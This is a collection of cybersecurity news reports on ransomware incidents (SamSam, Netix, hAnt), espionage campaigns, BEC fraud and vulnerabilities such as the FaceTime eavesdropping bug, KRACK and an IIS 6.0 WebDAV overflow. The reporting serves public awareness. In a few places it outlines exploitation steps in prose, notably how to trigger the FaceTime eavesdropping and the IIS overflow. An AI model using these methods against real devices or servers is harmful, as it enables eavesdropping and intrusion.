“The ongoing investigation will determine whether personal information, financial, or employee data has been compromised,” he said during a press briefing. “As a precaution, we are asking that all employees take the appropriate measures to ensure their data is not compromised. The city advises employees to monitor and protect personal information and in the coming days we will offer employees additional resources if needed.” 
What the city didn’t officially disclose was the ransomware note discovered in the investigation. A screenshot reveals the hackers’ demands: 0.8 Bitcoins for each seized computer, or six bitcoins to unlock all computers held hostage, equaling to around $51,000 in real cash. Once Atlanta sends the Bitcoins to a digital wallet, the city is to leave a message containing the host name on a specific website. The hackers will then provide decryption software to release the computers from captivity. 
The SamSam malware doesn’t take the typical route of installing itself on computers when unsuspecting owners click a link within an email. Instead, hackers find unpatched vulnerabilities in network servers and manually unleash SamSam to seize key data systems and cause maximum damage to the company’s infrastructure. 
SamSam is one of many in a family of ransomware targeting government and healthcare organizations. It was first observed in 2015 and encrypts various file types using the Advanced Encryption Standard (aka Rijndael). It then encrypts that key with RSA 2048-bit encryption to make the files utterly unrecoverable. 
As of Friday morning, Atlanta’s main website and its affiliated portals remained unaffected by the ransomware attack.

Remember that giant poster that Apple put up in Las Vegas during the recent Consumer Electronics Show that stated what happens on your iPhone, stays on your iPhone? I'm willing to bet many at Apple are trying hard to forget it right now as news breaks of a vulnerability in the group functionality of its FaceTime application that allows users to eavesdrop on the people being called, even if they didn't pick up the call!
The shockingly simple exploit works with any pair of iOS devices running iOS 12.1 or later. ""The bug lets you call anyone with FaceTime, and immediately hear the audio coming from their phone - before the person on the other end has accepted or rejected the incoming call"" according to Benjamin Mayo at 9to5Mac who first broke the story and adds ""there's a second part to this which can expose video too...""
The exploit really is stupidly easy to pull off, essentially just requiring the caller to add their own number while a call is dialing in order to start a group chat that includes themselves and the audio of the person being called. It doesn't matter if the recipient has accepted the call or not, all audio captured while the iPhone is ringing can be heard by the caller. If the recipient presses the power button from the lockscreen, used to accept or reject the incoming FaceTime chat, then video is also sent to the caller. One user, @Jessassin, tweeted that if you join the call using your invitation on another iPhone then you also get the video stream despite the call not being answered on the destination device.
What's more, the bug isn't limited to iPhone users and if the recipient is using a Mac then, as it rings for a longer default than a handset, the eavesdropping can potentially continue for a longer period. This is particularly worrying as a Mac user may well be away from the device for a long, certainly more so than we are from our smartphones, and during that time anyone could be listening in on whatever was happening in that house or office.
So, what do you need to do now? The good news is that Apple has responded by temporarily suspending the Group FaceTime functionality until a permanent fix can be rolled out. An Apple spokesperson told BuzzFeed that a fix ""will be released in a software update later this week."" However, there have been reports of some users still able to exploit the eavesdropping vulnerability even after Apple made this announcement, 9to5Mac being among them.

Saudi Arabian security officials said on Monday that the country had been targeted as part of a wide-ranging cyber espionage campaign observed since February against five Middle East nations as well as several countries outside the region.
The Saudi government’s National Cyber Security Center (NCSC) said in a statement the kingdom had been hit by a hacking campaign bearing the technical hallmarks of an attack group dubbed “MuddyWater” by U.S. cyber firm Palo Alto Networks.
Palo Alto’s Unit 42 threat research unit published a report last Friday showing how a string of connected attacks this year used decoy documents with official-looking government logos to lure unsuspecting users from targeted organizations to download infected documents and compromise their computer networks.
Documents pretending to be from the U.S.National Security Agency, Iraqi intelligence, Russian security firm Kaspersky and the Kurdistan regional government were among those used to trick victims, Unit 42 said in a blog post (goo.gl/SvwrXv). 
The Unit 42 researchers said the attacks had targeted organizations in Saudi Arabia, Iraq, the United Arab Emirates, Turkey and Israel, as well as entities outside the Middle East in Georgia, India, Pakistan and the United States.
The Saudi security agency said in its own statement that the attacks sought to steal data from computers using email phishing techniques targeting the credentials of specific users.
The NCSC said they also comprised so-called “watering hole” attacks, which seek to trick users to click on infected web links to seize control of their machines. 
The technical indicators supplied by Unit 42 are the same as those described by the NCSC as being involved in attacks against Saudi Arabia. The NCSC said the attacks appeared to be by an “advanced persistent threat” (APT) group - cyber jargon typically used to describe state-backed espionage.
Saudi Arabia has been the target of frequent cyber attacks, including the “Shamoon” virus, which cripples computers by wiping their disks and has hit both government ministries and petrochemical firms.
Saudi Aramco, the world’s largest oil company, was hit by an early version of the “Shamoon” virus in 2012, in the country’s worst cyber attack to date.
The NCSC declined further comment on the source of the attack or on which organizations or agencies were targeted. Unit 42 said it was unable to identify the attack group or its aims and did not have enough data to conclude that the MuddyWater group was behind the Saudi attacks as outlined by NCSC. 
“We cannot confirm that the NCSC posting and our MuddyWater research are in fact related,” Christopher Budd, a Unit 42 manager told Reuters. “There’s just not enough information to make that connection with an appropriate level of certainty.”
Palo Alto Networks said the files it had uncovered were almost identical to information-stealing documents disguised as Microsoft Word files and found to be targeting the Saudi government by security firm MalwareBytes in a September report.

Save the Children Foundation has revealed that the charity was targeted by fraudsters last year, leading to the loss of $1 million.
Speaking to the Boston Globe, the US arm of the non-profit, which supports children worldwide, said that con artists managed to compromise an employee's email account in order to masquerade as the staff member in question.
Once access was gained to the account, the hackers behind the scam created a number of false invoices and related documents which described a need to purchase solar panels for health centers located in Pakistan.
The Connecticut-based charity organization fell for the ruse, conducted in May 2017, and approved the transfer of close to $1 million to an entity in Japan which was used as a front to rake in the proceeds.
By the time the foundation realized the invoice was false, it was too late and the money was gone.
The publication says that Save the Children possessed insurance which covered close to all of the lost funds, and in the end, the charity only lost $112,000.
""We have improved our security measures to help ensure this does not happen again,"" Stacy Brandom, the chief financial officer of Save the Children told the Globe. ""Fortunately, through insurance, we were ultimately reimbursed for most of the funds.""
The scammers targeting the charity appeared to follow the rules of Business Email Compromise (BEC) attacks almost to the letter. These campaigns have a number of steps, compromise a business email account via brute-force hacking or social engineering; pretend to be a legitimate staff member, and lure another individual to approve false invoices or fraudulent payments.
The FBI has previously warned that December 2016 and May 2018, there was a 136 percent increase in BEC scams, reported across 150 countries, Ill-gotten funds are often sent to entities in Asia and billions of dollars have been lost.
In February, IBM said a single BEC scam originating in Nigeria led to the loss of millions of dollars belonging to Fortune 500 companies.
These types of scams are incredibly common and it can be difficult to track down the fraudsters responsible, who may be located in any country in the world. However, on rare occasion, a BEC scam artist is taken to task for their actions.
In September, a man from Nigeria was ordered to pay $2.5 million and serve five years in prison for conducting a variety of BEC scams against enterprise companies. Prosecutors estimate that the con artist defrauded victims out of hundreds of millions of dollars.

Hackers logged into the hospital’s remote access portal using a third-party vendor’s username and password.
Greenfield, Indiana-based Hancock Health paid hackers 4 bitcoin or about $47,000 to unlock its network on Saturday, after the health system fell victim to a ransomware attack on Thursday night.
Hackers compromised a third-party vendor’s administrative account to the hospital’s remote-access portal and launched SamSam ransomware. The virus infected a number of the hospital’s IT system and, according to local reports, the malware targeted over 1,400 files and changed the name of each to “I’m sorry.” 
Hancock officials followed its incident response and crisis management plan and contacted legal representation and outside security firm immediately following the discovery of the attack. Hospital leadership also contacted the FBI for advisory assistance.
The incident was contained by Friday and officials said the next focus was recovery. 
Hancock Health was given just seven days to pay the ransom. While officials said Hancock could have recovered the affected files from backups, it would have taken days or possibly weeks to do so. And it would have been more expensive.
“We were in a very precarious situation at the time of the attack,” Hancock Health CEO Steve Long said in a statement. “With the ice and snow storm at hand, coupled with one of the worst flu seasons in memory, we wanted to recover our systems in the quickest way possible and avoid extending the burden toward other hospitals of diverting patients. Restoring from backup was considered, though we made the deliberate decision to pay the ransom to expedite our return to full operations.”
Hackers released the files early Saturday after they retrieved the bitcoins. The hospital’s critical systems were restored to normal function on Monday.
The forensic analysis found patient data was not transferred outside of the hospital’s network, and the FBI confirmed the motivation for SamSam hackers is ransom payment, not to harvest patient data.
The virus did not impact any equipment used to treat patients. However, the hospital’s patient portal was down during the security incident.
After recovery, officials asked employees to reset passwords and implemented a security feature that could detect similar attacks in the future.
The breach should serve as a wake-up call that ransomware attacks can happen. However, it’s important to note the FBI, the U.S. Department of Health and Human Services and a laundry list of security experts have long stressed that organizations should not pay ransoms to hackers.
While the hackers returned the files to Hancock, there was no guarantee that would happen. For example, Kansas Heart Hospital paid a ransom in May 2016, and the hackers kept the files and demanded another payment. The hospital declined to pay a second time.
Secondly, when an organization pays, hackers place the business on a list of those willing to pay the ransom and can expect to be hit again in the future.
“There are lists out there, if you pay once, you may end up having to pay again because you’ve been marked as an organization that will pay,” said CynergisTek CEO Mac McMillan.

On the one hand, it gives them a bit of plausible deniability while reaping the potential spoils of each attack, but if the hackers aren't kept on a tight leash things can turn bad.
Karim Baratov, the 22-year-old Canadian hacker who the FBI alleges Russia's state security agency hired to carry out the Yahoo breach, didn't care much for a low profile.
His Facebook and Instagram posts boasted of the million-dollar house he bought in a Toronto suburb and there were numerous pictures of him with expensive sports cars -- the latest an Aston Martin DB9 with the license plate ""MR KARIM.""
But forget those for a moment and consider he wasn't very careful in hiding his hacking work.
In the domain name records, he listed his home address.
“When you bring in amateurs who don’t follow standard protocol, that carries risk,” said Alex Holden, chief information security officer at Hold Security.
At the time, the company notified the FBI but only believed 26 accounts had been targeted.
It wasn't until mid 2016 that the true enormity of the hack started to become apparent.
Security experts say it’s possible Baratov or a second hacker hired to help might have bragged online about the hack at some point, tipping off U.S. investigators.
And then in August 2016 a database allegedly stolen from Yahoo was found circulating on the black market.
“Some of the information about this hack was basically leaked,” Holden said.
“That’s not a sign of a mature intelligence operation”.
So why did Russia turn to a 22-year-old from Canada?
According to the indictment, Baratov broke into the accounts through spear phishing email attacks, which are often designed to dupe victims into handing over password information.
However, spear phishing only works best if the emails appear authentic.
“The benefit of having Karim, the Canadian, on the team probably allowed creation of far more believable phishing attacks due to his being a native English speaker,” said Chester Wisniewski, a research scientist at security firm Sophos, in an email.
In addition to Baratov, the Russian agents allegedly hired a 29-year-old Latvian named Aleksey Belan, who pulled off the main hack against Yahoo, and stole the database involving 500 million user accounts.
By outsourcing the operation to Belan, Russia probably wanted to conceal the true motives for the Yahoo breach, Wisniewski said.
Prior to Wednesday’s indictment, Belan himself was already a wanted man for hacks against U.S. e-commerce companies.
“There is also the ‘cover’ of criminal actions to potentially obfuscate the spying that was allegedly the real purpose”.
In response to Wednesday's criminal indictments by the FBI, the Russian government is denying any involvement, and calling the allegations a distraction.
Baratov, who has been arrested in Canada, is also claiming innocence, according to his lawyer.
But if the allegations are true, it does show one example of how Russia is harnessing the power of cybercriminals for spying purposes -- and how it can get sloppy.

Sensors used to detect the level of ambient light can be used to steal browser data, according to privacy expert Lukasz Olejnik.
Over the past decade, ambient light sensors have become quite common in smartphones, tablets, and laptops, where they are used to detect the level of surrounding light and automatically adjust a screen's intensity to optimize battery consumption... and other stuff.
The sensors have become so prevalent, that the World Wide Web Consortium (W3C) has developed a special API that allows websites (through a browser) to interact with a device's ambient light sensors.
Browsers such as Chrome and Firefox have already shipped versions of this API with their products.
Last month, in a discussion of the W3C Generic Sensor specification, the Google team proposed that ambient light sensors (ALS), together with gyroscope, magnetometer, and accelerometer sensors, should be exempt from the browser permissions system. In other words, websites using these sensors won't have to ask users for explicit permission before accessing the any of these four sensors.
Google's opinion is that by removing this permission requirement, browsers will be on par with mobile applications, which also don't have to ask the user for permission before accessing these sensors.
This proposal didn't go well with Olejnik and fellow researcher Artur Janc, who in a series of demos, have proved that light radiating from the device's screen, is often picked up by the ambient light sensors.
A determined attacker that can lure victims to his site, or one that can insert malicious code on another site, can determine which URLs a user has visited in the past. The whole attack relies on using different colors for normal and previously visited links, which produce a small light variation that ambient light sensors can pick up.
Furthermore, Olejnik and Janc also proved that ambient light sensors can steal QR codes, albeit this attack takes longer to perform.
Right now, ambient light sensors readings are blocked in Chrome behind settings flags, as the API is experimental, but they're supported in Firefox via DeviceLight events.
According to Olejnik, mitigating this attack is simple, as it only requires browser makers and the W3C to adjust the default frequency at which the sensors report their readings. Furthermore, the researcher also recommends that browser makers quantize the result by limiting the precision of the sensor output to only a few values in a preset range.
Both attacks Olejnik and Janc devised take from seconds to minutes to execute. With these mitigations in place, the attacks wouldn't be stopped, but they would take even longer to perform, making any of them impractical in the real world. In the long run, Olejnik and Janc hope to see access to these sensors behind a dedicated browser permission.
The two researchers filed bug reports with both Chrome and Firefox in the hopes their recommendations will be followed.
Olejnik has previously showed how battery readouts can allow advertisers to track users online, how the new W3C Web Bluetooth API is riddled with privacy holes, and how the new W3C Proximity Sensor API allows websites and advertisers to query the position of nearby objects.

Aspiring Netflix users who don’t want to actually pay for the popular video on demand service are being targeted with a new type of ransomware.
Detected as Netix by Trend Micro, the ransomware is hidden in an executable (Netflix Login Generator v1.1.exe) that poses as a software for creating valid Netflix login credentials.
The file is usually offered for download on sites sharing crackers and free access to paid online services.
Users who download and run the file will be faced with the above screen.
Clicking the “Generate Login!” button will open another one, offering a username and password.
Whether the login credentials actually work or not is unknown.
But the other executable dropped by the initial one does work, and it starts encrypting a variety of file types in the machine’s C:\Users directory, including images, videos, archive files, and Office documents.
“The ransomware employs AES-256 encryption algorithm and appends the encrypted files with the .se extension.
The ransom notes demand $100 worth of Bitcoin (0.18 BTC) from its victims,” Trend Micro warns.
The ransomware needs to connect to a C&C server to work and to receive the ransom note and warning to display:
Interestingly enough, only users of Windows 7 or 10 are in danger from this particular piece of ransomware, as it won’t run on other versions of the OS.
Victims are urged by the crooks to pay the ransom in order to receive the decryption key, but should know that even if they do, there is no guarantee they will get the key.
Regularly backing up important files is the best way to assure yourself that even if you fall for social engineering approaches such as this one, you’ll be able to avoid paying the ransom and losing your files forever.

Earlier this month, Salted Hash reported on a surge in attacks against publicly accessible MongoDB installations.
Since January 3, the day of that first report, the number of victims has climbed from about 200 databases to more than 40,000.
In addition to MongoDB, those responsible for the attacks have started targeting Elasticsearch and CouchDB.
No matter the platform being targeted, the message to the victim is the same; send a small Bitcoin payment to the listed address, or forever lose access to your files.
[ Learn about top security certifications: Who they're for, what they cost, and which you need.
The problem is, some of the more recent attacks show evidence the database was erased.
So even if the ransom is paid, the data is lost for good.
The researchers tracking these attacks are aware of at least four individuals who delete the databases entirely after running a list command.
Once deleted, they’ll leave the ransom note and logoff the system.
So far, these individuals have used more than a dozen Bitcoin wallet addresses, and nine different email accounts.
The tracking document is available on Google Docs.
Only one of those victims had backups to use when the ransom payment failed.
Soon, criminals started going after other development platforms, such as Elasticsearch - a Java-based search engine that's popular in enterprise environments.
Then they moved on to public facing Hadoop and CouchDB deployments.

 A hacker or group of hackers is apparently trying to extort Apple over alleged access to a large cache of iCloud and other Apple email accounts.
The hackers, who identified themselves as 'Turkish Crime Family', demanded $75,000 in Bitcoin or Ethereum, another increasingly popular crypto-currency, or $100,000 worth of iTunes gift cards in exchange for deleting the alleged cache of data.
""I just want my money and thought this would be an interesting report that a lot of Apple customers would be interested in reading and hearing,"" one of the hackers told Motherboard.
The hackers provided screenshots of alleged emails between the group and members of Apple's security team.
One also gave Motherboard access to an email account allegedly used to communicate with Apple.
""Are you willing to share a sample of the data set?""
an unnamed member of Apple's security team wrote to the hackers a week ago, according to one of the emails stored in the account.
The hackers also uploaded a YouTube video of them allegedly logging into some of the stolen accounts.
The hacker appears to access an elderly woman's iCloud account, which includes backed-up photos, and the ability to remotely wipe the device.
""We firstly kindly request you to remove the video that you have uploaded on your YouTube channel as it's seeking unwanted attention, second of all we would like you to know that we do not reward cyber criminals for breaking the law,"" a message allegedly from a member of Apple's security team reads.
The alleged Apple team member then says archived communications with the hacker will be sent to the authorities.
According to one of the emails in the accessed account, the hackers claim to have access to over 300 million Apple email accounts, including those use @icloud and @me domains.
However, the hackers appear to be inconsistent in their story; one of the hackers then claimed they had 559 million accounts in all.
The hackers did not provide Motherboard with any of the supposedly stolen iCloud accounts to verify this claim, except those shown in the video.
By reading other emails included in the account, it appears the hackers have approached multiple media outlets.
This may be in an attempt to put pressure on Apple; hackers sometimes feed information to reporters in order to help extortion efforts.
After the publication of this article, an Apple spokesperson told Motherboard in an email, ""There have not been any breaches in any of Apple's systems including iCloud and Apple ID.
The alleged list of email addresses and passwords appears to have been obtained from previously compromised third-party services.

That lingering Heartbleed flaw recently discovered in 200,000 devices is more insidious than that number indicates.
According to a report posted by Shodan, the Heartbleed vulnerability first exposed in April 2014 was still found in 199,594 internet-accessible devices during a scan it performed last weekend.
But according to open-source security firm Black Duck, about 11% of more than 200 applications it audited between Oct  2015 and March 2016 contained the flaw, which enables a buffer overread that endangers data from clients and servers running affected versions of OpenSSL.
The company’s vice president of security strategy Mike Pittenger says it’s likely most of those machines have been remediated, but it doesn’t address the countless other applications – commercial and proprietary - Black Duck didn’t audit.
“However, I would not extrapolate that to say 11% of all commercial applications were vulnerable to Heartbleed at that time”.
That 11% is a number from the company’s last published report.
In a new report due out next month that hasn’t been wrapped up yet, that number is likely to dip into the single digits, but is still significant.
The problem is that commercial software in general uses a great deal of open source code – 35% on average - and authors of the code don’t necessarily have processes in place to track when vulnerabilities are found in that code and to then patch them, he says.
He says Black Duck’s study finds that two-thirds of these applications have open-source vulnerabilities of one kind or another and that they average 5 years old.
In regard to Heartbleed in particular, he says the reports draw on anonymized data about its audits so they don’t reveal the specific applications in which the Heartbleed vulnerability was found.
Running vulnerable applications in a regulated environment could have consequences for the enterprises using them, he says, because the security threat they represent could violate HIPAA or PCI security and privacy requirements.
The Shodan report on the prevalence of Heartbleed showed that the individual entities hosting the largest number of Heartbleed-vulnerable devices were service providers.
That may be because these machines were set up a while ago and are no longer in use but were never taken offline, Pittenger says.

Cyberthreats are a constant risk and affect public administrations significantly.
So much so that they have become a powerful instrument of aggression against public entities and citizens.
They can lead to a serious deterioration in the quality of service, and also, above all, to data leaks concerning everything from personal information to state secrets.
The combination of new technologies and the increase in the complexity of attacks, as well as the professionalization of cybercriminals, is highly dangerous.
Last December, a large-scale spam campaign spanning more than ten countries was carried out, and specifically targeted a major European ministry.
The attack, via phishing, was highly advanced and combined social engineering tactics with a powerful Trojan.
The attack is sent by email with an attached Word document.
At first, we suspected that it was a targeted attack, since the message came, supposedly, from a healthcare company and the recipient was an employee of the Ministry of Health in a European country.
The present analysis describes the technical features of the harmful code found in the macro of the Word document.
The goal of the macro was to download and run another malicious component.
Below are shown a few static properties of the analyzed files.
The hash of the Word document is the following:
MD5:  B480B7EFE5E822BD3C3C90D818502068
SHA1:  861ae1beb98704f121e28e57b429972be0410930
According to the document’s metadata, the creation date was 2016-12-19.
The malicous code’s signature, downloaded by Word, is the following:
MD5:  3ea61e934c4fb7421087f10cacb14832
SHA1:  bffb40c2520e923c7174bbc52767b3b87f7364a9
The Word document gets to the victim’s computer by way of a spam email coming from a healthcare company.
The text tricks the recipient into beleiving that the content is protected and needs to run the macro in order to gain access to it.
According to the data recovered by Panda Security’s Collective Intelligence, this spam campaign took place on December 19, 2016 and affected several countries.
Interactions with the infected system
The basic function of the macro consists in downloading and running another malicious code from a URL embedded in the macro itself.
Also, the macro is designed to run immediately upon being opened.
Part of the obfuscated code contained in the macro
Once the macro is running, the Word doc runs the following command in the system:

?\AppData\Roaming.eXe’
The system symbol (cmd.exe) runs the powershell with two embedded commands going through parameters:
Thanks to the data obtained by the Intelligence Collective at Panda Security, we know that the last malicious code to be distributed by this campaign is a variant of the Dyreza family.
Panda’s clients were protected proactively, without need of signatures or updates.
The purpose of the malicious code is to steal credentials from browsers and add the compromised machine to bot network.
It then waits for commands from the Command & Control Server.
These commands come from the cybercriminals that operate it, and is able to download further new malware and carry out all kinds of malicious actions.
Digitization in Public Administration leads to the exponential growth of the creation, storage and management of huge quantities of confidential data — data that does not allow for a single oversight.

In the wake of a weekend cyber attack, ECMC officials say the hospital’s IT staff discovered the virus and shut down the hospital’s computer network, before it could infect their files. ECMC spokesman Peter Cutler said, State Police and the FBI are investigating.
“We do know that a virus was launched into our system and the good news, again, is that we reacted to it immediately.”
With the medical center’s computer network still offline, ECMC is conducting business the old fashioned way, on paper—no website, no email—and Cutler says they don’t believe patient files were compromised in any way.
“Through the assessments that we have been running, we have seen no indication that there has been a compromise of patient health information.”
Investigators would not say how hackers attacked ECMC’s computers, but authorities in the field of cyber security say, this attempted intrusion has all the hallmarks of ransomware.
University at Buffalo cyber security expert Arun Vishwanath says ransomware attacks have grown exponentially in the last two years, and likens them to Internet extortion.
“They are very successful, and so that is why we are seeing an exponential growth in ransomware attacks. We are talking about somewhere between 5,000 attacks per day that are reported–let alone the ones that are not even reported.”
Vishwanath says ransomware attacks are big reward low risk ventures, since the hackers are usually from other countries, and rarely get caught. Unwitting victims download an infected attachment from an email and the virus spreads quickly.
“The moment you click on the malware, this malware basically locks down your computer, and all the files in it, and any file that is connected to any other computer that you are connected to. So this can spread through your network in minutes.”
The hacker then demands the target pay a ransom to get their files unencrypted, and in just about every ransomware attack, the hackers cover their tracks by demanding payment in bitcoin–a virtual currency that is hard, if not impossible to trace.
Once the ransom is paid, the hackers send their victim an electronic key to unlock their encrypted files, but if the payment is not made within a certain time frame the hacked files are lost forever.

In wake of an attack on computers at Colorado’s DOT, experts at Webroot shed light on ransomware
Last month, employees at the Colorado Department of Transportation were greeted by a message on their computer screens similar to this:
“All your files are encrypted with RSA-2048 encryption. … It’s not possible to recover your files without private key. … You must send us 0.7 BitCoin for each affected PC or 3 BitCoins to receive ALL Private Keys for ALL affected PC’s.”
CDOT isn’t paying, but others have. In fact, so-called ransomware has become one of the most lucrative criminal enterprises in the U.S. and internationally, with the FBI estimating total payments are nearing $1 billion. Hackers use ransomware to encrypt computer files, making them unreadable without a secret key, and then demand digital currency like bitcoin if victims want the files back — and many victims are falling for that promise.
To better understand how ransomware works and how it has spread so effectively, The Denver Post talked with Broomfield anti-malware company Webroot, which got its start in the late 1990s cleansing computer viruses from personal computers.
“The end goal is just to put ransomware on the computer because right now the most successful way for cybercriminals to make money is with ransoming your files,” said Tyler Moffitt, a senior threat research analyst at Webroot.
Ransomware infects more than 100,000 computers around the world every day and payments are approaching $1 billion, said U.S. Deputy Attorney General Rod J. Rosenstein during the October 2017 Cambridge Cyber Summit, citing FBI statistics. A study by researchers at Google, Chainalysis, University of California San Diego and NYU Tandon School of Engineering estimated that from 2016 to mid 2017, victims paid $25 million in ransom to get files back.
And one out of five businesses that do pay the ransom don’t get their data back, according to 2016 report by Kaspersky Labs.
It’s a growing business for cybercriminals. And whether to pay or not is something each user or company must decide.
Last spring, the Erie County Medical Center in New York was attacked by SamSam due to a misconfigured web server, according to The Buffalo News. Because it had backed up its files, the hospital decided not to pay the estimated $44,000 ransom. It took six weeks to get back to normal at a recovery cost of nearly $10 million.
More recently in January, the new SamSam variant sneaked into Indiana hospital Hancock Health, which decided to pay 4 bitcoin, or about $55,000, in ransom. Attackers gained entry by using a vendor’s username and password on a Thursday night. The hospital was back online by Monday morning.
Other times, malware isn’t so obvious. Some propagate when user visits infected websites. A trojan named Poweliks injected bad code into vulnerable programs, like an unpatched Internet Explorer. Poweliks crept into the Windows registry to force the computer to do all sorts of nasty things, from demanding a ransom to joining a click-fraud bot network to click ads without the user even realizing it.
There also are booby-trapped ads, known as malvertising. They get into computers by, again, targeting flawed software and injecting malicious code. This has targeted programs like unpatched Adobe Flash Player, Java or other runtime software, or software that runs online all the time.

In a development that will do little to address concerns associated with the security of the cryptocurrency market, a new strain of ransomware, hAnt, has infected hundreds of mining rigs in China. The cryptovirus, which some people say first reared its head in August of last year, has primarily focused its attacks on mining farms in China, the country with the highest number of mining farms.
The ransomware, in a note written in both English and Chinese, has threatened to turn off the mining unit’s fan and compromise its overheating protection and by extension, the safety and integrity of the mining unit. To remove the ransomware, the culprit behind the strain has demanded either a ransom of 10 BTC to be paid or a malicious software that could potentially infect thousands be downloaded by the victim.
Although nobody is sure how these mining rigs came to be infected, it has been suggested by some that tainted rig firmware may have been the culprit. On the other hand, some also believe that the culprit has merely taken advantage of the vulnerability of mining equipment that is usually overclocked by mining pools to boost hash power and processing speeds. Presently, Antminer S9 and T9 devices are the worst affected mining equipment.
As of now, there haven’t been any reports of the cryptohackers actually going ahead with the threat and destroying mining rigs, which would suggest this being an empty threat. That being said, the mere fact of infection has led to several financial losses accruing from many mining operations shutting down temporarily, mining equipment being reflashed or tainted firmware simply being replaced by a new one.
Bitmain, the company that manufactures much of the Antminer equipment, that has come under the attack of hAnt has for its part, came forward and cautioned users against visiting untrusted third-party sites and downloading anything outside of Bitmain.
Either way, the development is not good news and does nothing to alleviate concerns associated with the safety and security of cryptocurrency-related operations and services.

Technology companies are starting to respond to a new Wi-Fi exploit affecting all modern Wi-Fi networks using WPA or WPA2  encryption. The security vulnerabilities allow attackers to read Wi-Fi traffic between devices and wireless access points, and in some cases even modify it to inject malware into websites. Security researchers claim devices running macOS, Windows, iOS, Android, and Linux will be affected by the vulnerabilities.
Microsoft says it has already fixed the problem for customers running supported versions of Windows. “We have released a security update to address this issue,” says a Microsoft spokesperson in a statement to The Verge. “Customers who apply the update, or have automatic updates enabled, will be protected. We continue to encourage customers to turn on automatic updates to help ensure they are protected.” Microsoft says the Windows updates released on October 10th protect customers, and the company “withheld disclosure until other vendors could develop and release updates.”
While it looks like Android and Linux devices are affected by the worst part of the vulnerabilities, allowing attackers to manipulate websites, Google has promised a fix for affected devices “in the coming weeks.” Google’s own Pixel devices will be the first to receive fixes with security patch level of November 6, 2017, but most other handsets are still well behind even the latest updates. Security researchers claim 41 percent of Android devices are vulnerable to an “exceptionally devastating” variant of the Wi-Fi attack that involves manipulating traffic, and it will take time to patch older devices.
The Verge has reached out to a variety of Android phone makers to clarify when security patches will reach handsets, and we’ll update you accordingly. At the time of writing, Apple has not yet clarified whether the latest versions of macOS and iOS are vulnerable.
The Wi-Fi Alliance, a network of companies responsible for Wi-Fi, has responded to the disclosure of the vulnerabilities. “This issue can be resolved through straightforward software updates, and the Wi-Fi industry, including major platform providers, has already started deploying patches to Wi-Fi users,” says a Wi-Fi Alliance spokesperson. “Users can expect all their Wi-Fi devices, whether patched or unpatched, to continue working well together.”
Apple also confirmed to both The Verge and AppleInsider that the vulnerability is patched in a beta version of the current operating systems. The fix should go public in a few weeks, so iOS and macOS devices aren't in the clear just yet. AppleInsider also reports that AirPort hardware, including the Time Machine, AirPort Extreme base station, and AirPort Express do not have a patch. The publication's source also wasn't sure if one was in the works.

Nearly a week after it became the target of one of the largest ransomware attacks to date, the City of Atlanta has made progress toward recovery, but it is still far from business as usual. Hackers encrypted many of the city government's vital data and computer systems.
The ransomware attack, which Mayor Keisha Lance Bottoms characterized as ""a hostage situation,"" forced the city to shut down municipal courts and even prevented residents from paying bills online. The city has been unable to issue warrants, and in many cases city employees have had to fill out forms and reports by hand.
The hackers demanded that officials pay a ransom of US$51,000 to be sent to a bitcoin wallet.
Threat researchers from Dell-owned Secureworks, which is based in Atlanta, have been working to help the city recover from the attack.
The security firm identified the assailants as the SamSam hacking group, The New York Times reported on Thursday. That organization has been known for similar ransomware attacks; it typically makes ransom demands of $50,000 or more, usually payable only with bitcoin.
Secureworks has been working with the city's incident response team as well as the FBI, the Department of Homeland Security and the U.S. Secret Service. In addition, a number of independent experts, including researchers from Georgia Tech, have been called in to determine how the attack occurred and help strategize to prevent another such attack.
As of Thursday, the city's Department of Information Management, which first discovered the attack on March 21, said that it had found no evidence that customer or employee data was compromised. It nevertheless encouraged everyone to take precautionary measures, including the monitoring of personal accounts and protecting personal information.

In the evenings, Trump keeps himself company with television and his ""old, unsecured Android phone,"" according to a recent The New York Times report, which contradicts an earlier report that said he had ""traded in"" his old Android phone for a more secure one.
It's unclear exactly what type of phone he's using for his late-night White House tweeting, but it doesn't sound like it's a hardened, government-approved, Android phone such as the one supported by the Pentagon's Defense Information Systems Agency, which helps the White House with communications tools.
The source added that if they were to advise Trump on using cell phones, they'd tell him to use a highly customized one so hackers wouldn't have a comparable test device.
But the best thing, they added, would be to simply tell Trump: ""no more cell phones.""
Using any kind of phone, according to the source and other security researchers, is a risk in and of itself for Trump.
If someone were to hack Trump through his Twitter-phone (for lack of a better word), they might steal his password to other more important accounts, or, worse, they could jump to another device on the White House internal network, perhaps one that contains more sensitive information.
""[Trump] shouldn't have personal computers of any kind, they should be government controlled.""
In 2014, hackers broke into the White House network.
At the time, the Obama administration downplayed the intrusion, saying it only affected the unclassified networks, but former White House officials said that network can still hold sensitive information such as the president's schedule, staff member's emails and other information.
In theory, this is the kind of data hackers could get if they could get into the network from Trump's personal Android phone and then get into another computer connected to the same network.

Microsoft Internet Information Services (IIS) 6.0 has a Zero Day vulnerability attackers leveraged last summer and is likely undergoing exploitation now, researchers said.
The vulnerability is a buffer overflow in a function in the WebDAV service in IIS 6.0 in Microsoft Windows Server 2003 R2, and can end up triggered by attackers sending an overlong IF header in a PROPFIND request, said researchers at Trend Micro.
Unfortunately, Microsoft won’t patch the flaw because they stopped supporting Windows Server 2003 a few years ago (IIS 6.0 was in the OS).
There are a little over 600,000 publicly accessible IIS 6.0 servers on the Internet, and most of them are probably running on Windows Server 2003, according to a search of Shodan.
The risk of exploitation can end up mitigated by disabling the WebDAV service on the vulnerable IIS 6.0 installation, but not all administrators will want to do it.
There is a fix out there from Mitja Kolsek, chief executive of Acros Security and co-founder at 0patch.
The patch is free and its source code is open for inspection.

A group of financially motivated hackers is targeting networks and systems of North American companies, threatening to leak the stolen information and cripple the company by disrupting their networks if they don’t pay a hefty ransom.
The group, dubbed FIN10 by FireEye researchers, first gets access to the target companies’ systems through spear-phishing (and possibly other means), then uses publicly available software, scripts and techniques to gain a foothold into victims’ networks.
They use Meterpreter or the SplinterRAT to establish the initial foothold within victim environments (and later a permanent backdoor), then custom PowerShell-based utilities, the pen-testing tool PowerShell Empire, and scheduled tasks to achieve persistence. 
“We have also observed FIN10 using PowerShell to load Metasploit Meterpreter stagers into memory,” the researchers noted.
The group leverages Windows Remote Desktop Protocol (RDP) and single-factor protected VPN to access various systems within the environment. Finally, they  deploy destructive batch scripts intended to delete critical system files and shutdown network systems, in order to disrupt the normal operations of those systems.
“In all but one targeted intrusion we have attributed to FIN10, the attacker(s) demanded a variable sum payable in Bitcoin for the non-release of sensitive data obtained during network reconnaissance stages,” the researchers say. They requested sum varies between 100 to 500 Bitcoin.
